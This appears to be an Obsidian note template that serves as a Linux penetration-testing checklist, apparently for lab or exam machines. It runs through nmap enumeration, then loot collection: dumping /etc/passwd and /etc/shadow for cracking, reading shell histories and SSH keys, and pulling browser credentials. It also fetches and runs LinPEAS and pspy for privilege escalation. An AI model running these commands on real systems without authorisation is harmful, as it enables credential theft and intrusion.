<% tp.file.rename("0_SystemChecklist")%>

# Enumeration

```bash
export hip="";nmap --top-ports 30 $hip
```

```bash
i="$hip";sudo nmap --osscan-guess -T 5 -A -p- $i -oX - | xsltproc -o 0_overview.html - && firefox 0_overview.html && sudo nmap -T 5 -sUV --top-ports 100 $i -oN 0_udp_top100.txt
```

> Then, create services templates.

# Initial Foothold

> Use the service template to document possible attack vectors and document here which worked
### Old software

##### Example Software (v1.0.0)

	 `searchsploit` and Google Dorks

### Insecure configurations

##### Insecure configuration 1
	NSE scripts: `ls /usr/share/nmap/scripts`


# Loot

Hostname `hostname`
	

Flag `cat /home/$(id -un)/local.txt`
	

Upgrade [[1_shells#Upgrades]]
	
##### Users
```bash
cat /etc/passwd; cat /etc/shadow; w
```
	
`unshadow passwd shadow > unshadowed.txt` 
##### Network
```bash
ip a; /sbin/route; netstat -anp; sudo iptables -S
```
	
##### Interesting files
```bash
ls /home/*/.gpg/; ls /home/*/.ssh/; cat /home/*/.*_history; find / -name ".git" 2>/dev/null | cd | git config --list 2>/dev/null
```
	
##### Home folder
```bash
ls -al /home/*/; ls -al /root/; find / -user $(id -un) -type f 2>/dev/null | grep -Ev "^/sys|^/run|^/proc"
```
	
##### Advanced
X-Server: `pidof X`  (Extract cookies/passwords from browser with `pasco index.dat`)
Mounted Volumes: `cat /etc/fstab; mount; /bin/lsblk`
Drivers: `lsmod`, `/sbin/modinfo [module]`
# PrivEsc
Find Working Dir for attack
```bash
find / -writable -type d -print -quit 2>/dev/null
```
	

### LinPEAS
```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh; chmod +x linpeas.sh; ./linpeas.sh &> linpeas.txt & less -r +F linpeas.txt
```
Read it with color-highlighting using `less -r linpeas.txt`
```bash
grep "CRON" /var/log/syslog; dpkg -l
```
Get commands run by non-accessible cronjobs and other tasks
```bash
wget -q https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32 && chmod +x pspy32 && timeout 30s ./pspy32 | tr -s ' ' | cut -d ' ' -f 3-4,7- | sed -e 's/$/\x1b[m/' | perl -ne 'BEGIN{$|=1}; print unless ${$_}++'
```

##### Finding 1
